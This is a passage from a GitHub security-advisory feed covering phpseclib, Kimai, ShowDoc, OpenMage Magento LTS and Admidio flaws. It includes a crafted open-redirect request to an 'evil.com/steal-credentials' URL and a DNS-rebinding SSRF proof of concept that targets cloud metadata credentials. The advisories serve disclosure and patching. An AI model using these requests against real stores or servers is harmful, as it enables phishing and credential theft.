-<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-3qpq-r242-jqj7">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-3qpq-r242-jqj7</a></li>
-<li><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></li>
-<li><a href="https://github.com/advisories/GHSA-3qpq-r242-jqj7">https://github.com/advisories/GHSA-3qpq-r242-jqj7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3qpq-r242-jqj7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:17:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib has a CVE-2024-27355 mitigation bypass — OID amplification DoS in ASN1::decodeOID()]]></title>
-        <id>https://github.com/advisories/GHSA-3qpq-r242-jqj7</id>
-        <link href="https://github.com/advisories/GHSA-3qpq-r242-jqj7"/>
-        <updated>2026-05-05T21:17:58.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Anyone loading untrusted ASN1 files (eg. X509 certificates, RSA PKCS8 private or public keys, etc)</p>
-<h3 id="patches">Patches</h3>
-<p><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No.</p>
-<h3 id="references">References</h3>
-<p><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-3qpq-r242-jqj7">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-3qpq-r242-jqj7</a></li>
-<li><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></li>
-<li><a href="https://github.com/advisories/GHSA-3qpq-r242-jqj7">https://github.com/advisories/GHSA-3qpq-r242-jqj7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3qpq-r242-jqj7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:17:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib has a CVE-2024-27355 mitigation bypass — OID amplification DoS in ASN1::decodeOID()]]></title>
-        <id>https://github.com/advisories/GHSA-3qpq-r242-jqj7</id>
-        <link href="https://github.com/advisories/GHSA-3qpq-r242-jqj7"/>
-        <updated>2026-05-05T21:17:58.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Anyone loading untrusted ASN1 files (eg. X509 certificates, RSA PKCS8 private or public keys, etc)</p>
-<h3 id="patches">Patches</h3>
-<p><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No.</p>
-<h3 id="references">References</h3>
-<p><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-3qpq-r242-jqj7">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-3qpq-r242-jqj7</a></li>
-<li><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></li>
-<li><a href="https://github.com/advisories/GHSA-3qpq-r242-jqj7">https://github.com/advisories/GHSA-3qpq-r242-jqj7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3qpq-r242-jqj7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:17:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[kimai/kimai] Kimai vulnerable to formula Injection via tag names in XLSX export]]></title>
-        <id>https://github.com/advisories/GHSA-3xc2-h5r3-wv3r</id>
-        <link href="https://github.com/advisories/GHSA-3xc2-h5r3-wv3r"/>
-        <updated>2026-05-05T20:53:41.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Any <code>ROLE_USER</code> can create a tag with a formula string as its name (e.g. <code>=SUM(54+51)</code>) via <code>POST /api/tags</code> and assign it to a timesheet. When an admin exports timesheets to XLSX, <code>ArrayFormatter.formatValue()</code> joins tag names with <code>implode()</code> and returns the result unchanged. OpenSpout promotes any <code>=</code>-prefixed string to a <code>FormulaCell</code>, writing <code>&lt;f&gt;SUM(54+51)&lt;/f&gt;</code> into the XLSX archive. Excel evaluates the formula when the file is opened.</p>
-<h2 id="details">Details</h2>
-<h3 id="1-arrayformatter-does-not-sanitize-before-returning">1. <code>ArrayFormatter</code> does not sanitize before returning</h3>
-<p><code>sanitizeDDE()</code> exists on <code>StringHelper</code> and is called by <code>TextFormatter</code>, but <code>ArrayFormatter</code> never calls it.</p>
-<pre><code class="language-php">// src/Export/Package/CellFormatter/ArrayFormatter.php:24
-return implode(', ', $value);  // no sanitizeDDE() call
-</code></pre>
-<h3 id="2-tag-name-validation-does-not-block-formula-trigger-characters">2. Tag name validation does not block formula trigger characters</h3>
-<p>The API blocks commas in tag names but permits <code>=</code>, <code>+</code>, <code>-</code>, and <code>@</code> - all valid formula prefixes in Excel and LibreOffice Calc.</p>
-<h3 id="3-openspout-silently-promotes-strings-to-formula-cells">3. OpenSpout silently promotes strings to formula cells</h3>
-<p><code>Cell::fromValue("=SUM(54+51)")</code> returns a <code>FormulaCell</code> with no warning.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>It logs in as normal user, creates tag <code>=SUM(54+51)</code>, assigns it to a timesheet.</li>
-<li>Admin has to export timesheets to Excel version via <code>/en/export/</code> endpoint.</li>
-</ol>
-<img src="https://github.com/user-attachments/assets/884c7943-5e3b-4647-8bcc-e264d6719d66" alt="image" height="700" width="1339">
-
-<img src="https://github.com/user-attachments/assets/ef28f2ad-7491-4a15-bb18-1fcd6ff5e55a" alt="formula_injection_tags" height="128" width="1304">
-
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Any <code>ROLE_USER</code> can plant a formula that executes on the workstation of any user who exports and opens timesheet data</li>
-<li>A single malicious tag poisons all future exports across all users and date ranges until the tag is deleted</li>
-</ul>
-<h2 id="fixes">Fixes</h2>
-<ol>
-<li>Prevent <code>=</code> being part of the tag name (and other fields as well)</li>
-<li>Use OpenSpout <code>TextCell</code> for everything that is a string</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kimai/kimai/security/advisories/GHSA-3xc2-h5r3-wv3r">https://github.com/kimai/kimai/security/advisories/GHSA-3xc2-h5r3-wv3r</a></li>
-<li><a href="https://github.com/advisories/GHSA-3xc2-h5r3-wv3r">https://github.com/advisories/GHSA-3xc2-h5r3-wv3r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3xc2-h5r3-wv3r</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T20:53:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[showdoc/showdoc] ShowDoc has an Injection vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-fm5r-cj7v-rj2c</id>
-        <link href="https://github.com/advisories/GHSA-fm5r-cj7v-rj2c"/>
-        <updated>2026-05-05T20:21:53.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability was determined in star7th ShowDoc up to 2.10.10/3.6.2/3.8.0. Affected by this vulnerability is an unknown functionality of the file server/Application/Api/Controller/PageController.class.PHP of the component API Page Sort Endpoint. Executing a manipulation of the argument pages can lead to sql injection. The attack may be launched remotely. Upgrading to version 3.8.1 addresses this issue. It is suggested to upgrade the affected component. According to the researcher, "[t]he vendor explicitly stated they will not backport patches to the older affected versions."</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6982">https://nvd.nist.gov/vuln/detail/CVE-2026-6982</a></li>
-<li><a href="https://gist.github.com/saDL0w/555e19668264f98d96259ad47ea33811">https://gist.github.com/saDL0w/555e19668264f98d96259ad47ea33811</a></li>
-<li><a href="https://github.com/star7th/showdoc/releases/tag/v3.8.1">https://github.com/star7th/showdoc/releases/tag/v3.8.1</a></li>
-<li><a href="https://vuldb.com/submit/795528">https://vuldb.com/submit/795528</a></li>
-<li><a href="https://vuldb.com/vuln/359525">https://vuldb.com/vuln/359525</a></li>
-<li><a href="https://vuldb.com/vuln/359525/cti">https://vuldb.com/vuln/359525/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-fm5r-cj7v-rj2c">https://github.com/advisories/GHSA-fm5r-cj7v-rj2c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fm5r-cj7v-rj2c</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-25T15:33:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openmage/magento-lts] Magento LTS Vulnerable to Open Redirect via Unvalidated `uenc` Parameter in `stockAction()`]]></title>
-        <id>https://github.com/advisories/GHSA-qpgq-5g92-j5q8</id>
-        <link href="https://github.com/advisories/GHSA-qpgq-5g92-j5q8"/>
-        <updated>2026-05-05T20:11:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Mage_ProductAlert_AddController::stockAction()</code> reads the uenc query parameter and passes it directly to <code>$this-&gt;_redirectUrl($backUrl)</code> without calling <code>$this-&gt;_isUrlInternal()</code> When the supplied <code>product_id</code> does not match any catalog product, the server issues an unvalidated HTTP 302 redirect to whatever URL was provided as <code>uenc</code>.</p>
-<h2 id="vulnerable-path">Vulnerable path:</h2>
-<pre><code class="language-php">// app/code/core/Mage/ProductAlert/controllers/AddController.php : stockAction()
-
-$backUrl = $this-&gt;getRequest()-&gt;getParam(Mage_Core_Controller_Front_Action::PARAM_NAME_URL_ENCODED);  // raw, no decode
-$productId = (int) $this-&gt;getRequest()-&gt;getParam('product_id');
-
-if (!$backUrl || !$productId) {
-    $this-&gt;_redirect('/');
-    return;
-}
-
-$product = Mage::getModel('catalog/product')-&gt;load($productId);
-
-if (!$product-&gt;getId()) {
-    $session-&gt;addError($this-&gt;__('Not enough parameters.'));
-    $this-&gt;_redirectUrl($backUrl);   // ← NO _isUrlInternal() check
-    return;
-}
-</code></pre>
-<h3 id="secure-peer-priceaction">Secure peer (priceAction()):</h3>
-<pre><code class="language-php">if (!$product-&gt;getId()) {
-    if ($this-&gt;_isUrlInternal($backUrl)) {  // ← validation present
-        $this-&gt;_redirectUrl($backUrl);
-    } else {
-        $this-&gt;_redirect('/');
-    }
-    return;
-}
-</code></pre>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<h3 id="prerequisites">Prerequisites</h3>
-<ul>
-<li>OpenMage LTS ≤ 20.16.0 with Product Alerts enabled (default configuration)</li>
-<li>A valid, logged-in customer session on the target store</li>
-</ul>
-<h4 id="step-1--authenticate-as-a-customer-attacker-controls-the-crafted-link-victim-must-be-logged-in">Step 1 – Authenticate as a Customer (Attacker controls the crafted link; victim must be logged in)</h4>
-<p>The <code>preDispatch()</code> hook calls <code>Mage::getSingleton('customer/session')-&gt;authenticate($this)</code>. If the request comes from an unauthenticated user, they are redirected to the login page first. The open redirect only fires after the customer is authenticated. This is the realistic attack scenario: the attacker sends a crafted link to a customer who is already logged in.</p>
-<img src="https://github.com/user-attachments/assets/64c18279-ec0a-4110-b8f4-d952870e348c" alt="image" height="638" width="1548">
-
-<h4 id="step-2--craft-the-malicious-url">Step 2 – Craft the Malicious URL</h4>
-<p>The <code>uenc</code> parameter is read raw via <code>getParam()</code> with no base64 decoding in this code path. A plain URL is sufficient and produces the redirect:</p>
-<pre><code>GET /productalert/add/stock/?product_id=99999&amp;uenc=https://evil.com/steal-credentials HTTP/1.1
-Host: &lt;store-hostname&gt;
-Cookie: om_frontend=&lt;authenticated-session&gt;
-</code></pre>
-<p>Key conditions:</p>
-<ul>
-<li><code>product_id</code> must reference a non-existent product (triggers the vulnerable branch; any large ID works)</li>
-<li><code>uenc</code> is the raw destination URL (no base64 encoding required)</li>
-</ul>
-<img src="https://github.com/user-attachments/assets/d8530247-2d2f-4747-bf16-ece71a507b50" alt="image" height="852" width="1554">
-
-
-<h2 id="impact">Impact</h2>
-<h3 id="technical-impact">Technical Impact</h3>
-<p>An attacker who controls the <code>uenc</code> parameter value can redirect any logged-in shopper to an arbitrary external URL. Because the redirect originates from the legitimate store domain, the victim’s browser shows the trusted store URL in the address bar momentarily before being sent to the attacker site. The HTTP 302 response exits the store’s origin before the browser shows anything to the user.</p>
-<h3 id="business-level-attack-vectors">Business-Level Attack Vectors</h3>
-<table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Credential phishing</td>
-<td>Craft a link claiming to show a stock notification. Customer lands on attacker’s login clone and reuses their password.</td>
-</tr>
-<tr>
-<td>OAuth / SSO token theft</td>
-<td>If the store uses a social login or “Login with Google” flow, the attacker can inject their redirect_uri via the open redirect, stealing OAuth tokens.</td>
-</tr>
-<tr>
-<td>Affiliate fraud</td>
-<td>Redirect customers from the legitimate store to a competing retailer after they click a “notify me” link.</td>
-</tr>
-<tr>
-<td>Malware distribution</td>
-<td>Redirect to drive-by-download pages with the store’s reputation acting as social proof.</td>
-</tr>
-</tbody></table>
-<h3 id="propagation">Propagation</h3>
-<p>A single malicious link can be embedded in:</p>
-<ul>
-<li>Customer emails (“Click here for stock notification preferences”)</li>
-<li>Forum posts, social media, or product reviews on the store</li>
-<li>SEO-poisoned search results that rank the store’s domain</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Apply the same <code>_isUrlInternal()</code> guard used in <code>priceAction()</code> to the <code>stockAction()</code> missing-product</p>
-<p>This is an AI-generated report.</p>
-<p>An attempt was made to test the same PoC against the online demo <a href="https://demo.openmage.org/">https://demo.openmage.org/</a> but it couldn't be reproduced. It was only reproduced against the local setup env against the latest version.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/OpenMage/magento-lts/security/advisories/GHSA-qpgq-5g92-j5q8">https://github.com/OpenMage/magento-lts/security/advisories/GHSA-qpgq-5g92-j5q8</a></li>
-<li><a href="https://github.com/advisories/GHSA-qpgq-5g92-j5q8">https://github.com/advisories/GHSA-qpgq-5g92-j5q8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qpgq-5g92-j5q8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T20:11:21.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[admidio/admidio] Admidio has an incomplete fix for CVE-2026-32812 (SSRF)]]></title>
-        <id>https://github.com/advisories/GHSA-hcjj-chvw-fmw9</id>
-        <link href="https://github.com/advisories/GHSA-hcjj-chvw-fmw9"/>
-        <updated>2026-05-05T20:03:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The incomplete SSRF fix in Admidio's <code>fetch_metadata.php</code> validates the resolved IP address but passes the original hostname-based URL to <code>curl_init()</code>, leaving a DNS rebinding TOCTOU window that allows redirecting requests to internal IPs.</p>
-<h3 id="affected-package">Affected Package</h3>
-<ul>
-<li><strong>Ecosystem:</strong> Other</li>
-<li><strong>Package:</strong> admidio</li>
-<li><strong>Affected versions:</strong> &lt; commit f6b7a966abe4d75e9f707d665d7b4b5570e3185a</li>
-<li><strong>Patched versions:</strong> &gt;= commit f6b7a966abe4d75e9f707d665d7b4b5570e3185a</li>
-</ul>
-<h3 id="severity">Severity</h3>
-<p>Medium</p>
-<h3 id="cwe">CWE</h3>
-<p>CWE-918 — Server-Side Request Forgery (SSRF)</p>
-<h3 id="details">Details</h3>
-<p>In <code>modules/sso/fetch_metadata.php</code> (lines 21-49), the SSO metadata fetch validates the URL scheme is HTTPS (line 21), runs <code>filter_var($rawUrl, FILTER_VALIDATE_URL)</code> (line 27), resolves the hostname via <code>gethostbyname()</code> and checks the IP against private/reserved ranges (lines 34-38), then passes the original URL with the hostname to <code>curl_init($url)</code> at line 41.</p>
-<p>The fundamental problem is at step 4: cURL resolves the hostname again independently. Between <code>gethostbyname()</code> at step 3 and <code>curl_exec()</code> at step 4, a DNS rebinding attack can cause the hostname to resolve to <code>169.254.169.254</code> (AWS metadata), <code>127.0.0.1</code>, or any other internal address. No <code>CURLOPT_RESOLVE</code> is set to pin the hostname to the validated IP.</p>
-<p>The TOCTOU window between <code>gethostbyname()</code> and <code>curl_exec()</code> is the core issue, and the patch does not close it.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-python">#!/usr/bin/env python3
-"""
-CVE-2026-32812 - Admidio SSRF via DNS Rebinding in fetch_metadata.php
-
-Vulnerability: modules/sso/fetch_metadata.php resolves hostname via gethostbyname()
-and checks if IP is private, but passes the ORIGINAL URL (with hostname) to curl_init().
-DNS rebinding can cause hostname to resolve to internal IP when cURL actually connects.
-
-Real vulnerable PHP code copied from:
-  Admidio/admidio, modules/sso/fetch_metadata.php
-
-This PoC runs the actual PHP validation logic via `php -r`.
-"""
-
-import subprocess
-import sys
-import os
-
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-VULN_PHP = os.path.join(SCRIPT_DIR, "fetch_metadata.php")
-
-
-def run_php(code):
-    return subprocess.run(["php", "-r", code], capture_output=True, text=True, timeout=15)
-
-
-def main():
-    if not os.path.exists(VULN_PHP):
-        print(f"ERROR: Vulnerable PHP source not found at {VULN_PHP}")
-        sys.exit(1)
-
-    print(f"Source file: {VULN_PHP}")
-    print("Extracted from: Admidio/admidio, modules/sso/fetch_metadata.php\n")
-
-    php_code = r"""
-    echo "=== CVE-2026-32812: Admidio SSRF via DNS Rebinding ===\n\n";
-
-    // Extracted from: modules/sso/fetch_metadata.php lines 21-49
-    // Character-for-character copy of the validation logic:
-    function test_admidio_ssrf_filter($rawUrl, $simulated_ip) {
-        // Only allow https:// scheme (line 21)
-        if (!preg_match('#^https://#i', $rawUrl)) {
-            return ['blocked' =&gt; true, 'reason' =&gt; 'Not HTTPS'];
-        }
-
-        // Validate URL (line 27)
-        $url = filter_var($rawUrl, FILTER_VALIDATE_URL);
-        if (!$url) {
-            return ['blocked' =&gt; true, 'reason' =&gt; 'Invalid URL'];
-        }
-
-        // Resolve hostname and block internal/private IP ranges (lines 34-38)
-        $host = parse_url($url, PHP_URL_HOST);
-        $ip = $simulated_ip;  // In real code: gethostbyname($host)
-
-        if (filter_var($ip, FILTER_VALIDATE_IP,
-            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
-            return ['blocked' =&gt; true, 'reason' =&gt; "Private/reserved IP: $ip"];
-        }
-
-        // VULNERABILITY: curl_init($url) at line 41 uses original URL with hostname
-        return [
-            'blocked' =&gt; false,
-            'url_passed_to_curl' =&gt; $url,
-            'host' =&gt; $host,
-            'checked_ip' =&gt; $ip,
-        ];
-    }
-
-    $tests = [
-        ['https://attacker-rebind.example.com/saml/metadata', '93.184.216.34',
-         'Public IP at check time - passes, then DNS rebinds to 169.254.169.254'],
-        ['https://attacker-rebind.example.com/saml/metadata', '169.254.169.254',
-         'After rebind to metadata - blocked IF re-checked'],
-        ['https://192.168.1.1/admin', '192.168.1.1',
-         'Direct private IP - blocked'],
-        ['https://10.0.0.1/internal', '10.0.0.1',
-         'Direct internal IP - blocked'],
-        ['http://attacker.com/metadata', '93.184.216.34',
-         'HTTP scheme - blocked (HTTPS required)'],
-        ['https://evil.com/metadata', '8.8.8.8',
-         'External HTTPS URL - passes'],
-    ];
-
-    $vuln_found = false;
-    foreach ($tests as $test) {
-        $result = test_admidio_ssrf_filter($test[0], $test[1]);
-        $status = $result['blocked'] ? 'BLOCKED' : 'PASSED';
-        echo sprintf("%-65s =&gt; %s\n", $test[2], $status);
-
-        if (!$result['blocked']) {
-            $curl_host = parse_url($result['url_passed_to_curl'], PHP_URL_HOST);
-            if ($curl_host !== $result['checked_ip']) {
-                echo "  VULN: cURL gets hostname '$curl_host' (checked IP: '{$result['checked_ip']}')\n";
-                echo "  DNS can rebind between gethostbyname() and cURL connect\n";
-                $vuln_found = true;
-            }
-        }
-    }
-
-    echo "\n=== Key Finding ===\n";
-    echo "fetch_metadata.php line 41: curl_init(\$url) uses ORIGINAL URL with hostname\n";
-    echo "IP check on line 35 used gethostbyname() result.\n";
-    echo "TOCTOU window: DNS can rebind between check and cURL connection.\n";
-    echo "CURLOPT_RESOLVE is NOT set to pin hostname to checked IP.\n\n";
-
-    if ($vuln_found) {
-        echo "VULNERABILITY CONFIRMED\n";
-    }
-    """
-
-    result = run_php(php_code)
-    print(result.stdout)
-    if result.stderr:
-        print(f"PHP stderr: {result.stderr}")
-
-    if "VULNERABILITY CONFIRMED" in result.stdout:
-        print("VULNERABILITY CONFIRMED")
-        sys.exit(0)
-    else:
-        print("Vulnerability test inconclusive")
-        sys.exit(1)
-
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<p><strong>Steps to reproduce:</strong></p>
-<ol>
-<li>Place the vulnerable <code>fetch_metadata.php</code> source in the same directory.</li>
-<li>Ensure PHP CLI is installed, then run <code>python3 poc.py</code>.</li>
-<li>Observe the TOCTOU window where cURL receives a hostname instead of the validated IP.</li>
-</ol>
-<p><strong>Expected output:</strong></p>
-<pre><code>VULNERABILITY CONFIRMED
-curl_init() uses the original hostname-based URL while IP validation used gethostbyname(), leaving a DNS rebinding TOCTOU window.
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>An attacker can exploit the SSO metadata fetch endpoint to make the Admidio server issue HTTPS requests to internal services. On cloud-hosted instances, this enables reading the instance metadata service (<code>169.254.169.254</code>) to steal IAM credentials. On-premise deployments can be used to scan internal networks or access localhost services.</p>
-<h3 id="suggested-remediation">Suggested Remediation</h3>
-<p>Use <code>CURLOPT_RESOLVE</code> to pin the hostname to the IP address returned by <code>gethostbyname()</code>, ensuring cURL connects to the exact IP that was validated:</p>
-<pre><code class="language-php">$resolve = ["$host:443:$ip"];
-curl_setopt($ch, CURLOPT_RESOLVE, $resolve);
-</code></pre>
-<h3 id="resources">Resources</h3>
-<ul>
-<li>Incomplete fix commit: <a href="https://github.com/Admidio/admidio/commit/f6b7a966abe4d75e9f707d665d7b4b5570e3185a">https://github.com/Admidio/admidio/commit/f6b7a966abe4d75e9f707d665d7b4b5570e3185a</a></li>
-<li>Original CVE: CVE-2026-32812</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Admidio/admidio/security/advisories/GHSA-6j68-gcc3-mq73">https://github.com/Admidio/admidio/security/advisories/GHSA-6j68-gcc3-mq73</a></li>
-<li><a href="https://github.com/Admidio/admidio/security/advisories/GHSA-hcjj-chvw-fmw9">https://github.com/Admidio/admidio/security/advisories/GHSA-hcjj-chvw-fmw9</a></li>
-<li><a href="https://github.com/Admidio/admidio/commit/f6b7a966abe4d75e9f707d665d7b4b5570e3185a">https://github.com/Admidio/admidio/commit/f6b7a966abe4d75e9f707d665d7b4b5570e3185a</a></li>
-<li><a href="https://github.com/advisories/GHSA-hcjj-chvw-fmw9">https://github.com/advisories/GHSA-hcjj-chvw-fmw9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hcjj-chvw-fmw9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T20:03:46.000Z</published>
     </entry>
 </feed>
